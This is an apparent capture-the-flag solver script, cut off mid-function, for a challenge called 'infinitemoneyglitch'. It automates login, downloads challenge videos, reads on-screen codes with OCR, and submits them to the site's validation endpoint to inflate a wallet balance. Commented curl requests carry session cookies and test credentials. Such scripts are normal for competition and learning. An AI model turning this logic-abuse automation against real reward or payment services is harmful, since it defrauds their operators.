`
import cv2
import pytesseract
import re
import requests
import time
import threading

framerate = 60
regex = re.compile(r'([0-9]{4})')
regex_video = re.compile(r'source src="(/stream/[a-f0-9\-]+)"')
regex_wallet = re.compile(r'Wallet</span> : ([0-9]+.[0-9]+€)')

elements_to_validate = []
arrayThread = []

lock = threading.RLock()

#curl 'http://infinitemoneyglitch.chall.malicecyber.com/validate'
#-X POST -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0'
#-H 'Accept: */*'
#-H 'Accept-Language: fr,fr-FR;q=0.8,en-US;q=0.5,en;q=0.3'
#-H 'Accept-Encoding: gzip, deflate'
#-H 'Referer: http://infinitemoneyglitch.chall.malicecyber.com/video'
#-H 'Content-Type: application/json'
#-H 'Origin: http://infinitemoneyglitch.chall.malicecyber.com'
#-H 'DNT: 1'
#-H 'Connection: keep-alive'
#-H 'Cookie: token=b3dbf682-0317-480e-ba7c-05a278b2c181'
#--data-raw '{"uuid":"fd5dcfd5-c40a-4ab3-91b0-4aa0e0ea6c83","code":"5756"}'

def processVideo(file):
    cam = cv2.VideoCapture(file)
    code = ""
    currentframe = 0
    while(True):

        ret, frame = cam.read()
        if ret:
            currentframe += 1
            if (currentframe%framerate == 0 or currentframe == 0):
                _, th = cv2.threshold(frame,127,255,cv2.THRESH_BINARY)
                string_found = pytesseract.image_to_string(th)
                if string_found != "":
                    m = regex.search(string_found)
                    if m is not None:
                        #print("code : {}".format(m.group(0)))
                        code = m.group(0)
                        break
        else:
            break

    cam.release()
    return code

#CONNECTION
#curl 'http://infinitemoneyglitch.chall.malicecyber.com/login'
#-X POST
#-H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0'
#-H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8'
#-H 'Accept-Language: fr,fr-FR;q=0.8,en-US;q=0.5,en;q=0.3'
#-H 'Accept-Encoding: gzip, deflate'
#-H 'Content-Type: application/x-www-form-urlencoded'
#-H 'Origin: http://infinitemoneyglitch.chall.malicecyber.com'
#-H 'DNT: 1'
#-H 'Connection: keep-alive'
#-H 'Referer: http://infinitemoneyglitch.chall.malicecyber.com/login'
#-H 'Upgrade-Insecure-Requests: 1' --data-raw 'email=celo12%40a.com&password=%26%26azer456&submit=Log+In'
def connectionToMoneyGlitch(session):
    session.post('http://infinitemoneyglitch.chall.malicecyber.com/login', data={'email':'celo12@a.com', 'password' :'aaaaaa', 'submit':'Log In'})


#curl 'http://infinitemoneyglitch.chall.malicecyber.com/video' --compressed -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8' -H 'Accept-Language: fr,fr-FR;q=0.8,en-US;q=0.5,en;q=0.3' -H 'Accept-Encoding: gzip, deflate' -H 'DNT: 1' -H 'Connection: keep-alive' -H 'Referer: http://infinitemoneyglitch.chall.malicecyber.com/cards' -H 'Cookie: token=766e62fd-07df-4320-8e92-1fa60eed3b39' -H 'Upgrade-Insecure-Requests: 1'
def getVideo(session):
    stream_link = ""
    uuid_video = ""
    r = session.get('http://infinitemoneyglitch.chall.malicecyber.com/video')
    m = regex_video.search(r.text)
    if m is not None:
        print("video : {}".format(m.group(1)))
        stream_link = m.group(1)
        tmp = stream_link.split("/")
        uuid_video = tmp[2]
    return stream_link, uuid_video

def storeVideo(session, stream_link, uuid_video):
    response = session.get('http://infinitemoneyglitch.chall.malicecyber.com/'+stream_link[1:])
    with open(uuid_video+".mp4", "wb") as f:
        f.write(response.content)

#curl 'http://infinitemoneyglitch.chall.malicecyber.com/validate' -X POST -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0' -H 'Accept: */*' -H 'Accept-Language: fr,fr-FR;q=0.8,en-US;q=0.5,en;q=0.3' -H 'Accept-Encoding: gzip, deflate' -H 'Referer: http://infinitemoneyglitch.chall.malicecyber.com/video' -H 'Content-Type: application/json' -H 'Origin: http://infinitemoneyglitch.chall.malicecyber.com' -H 'DNT: 1' -H 'Connection: keep-alive' -H 'Cookie: token=623d8a7a-9b37-4e60-b26e-7b05d7450e78' --data-raw '{"uuid":"6694fad8-97cd-4a31-a2a0-8855ebce7b5f","code":"ghhghg"}'
def validateCode(session, uuid_video, code):
    headers = {
        'Content-Type': 'application/json',
        'Re
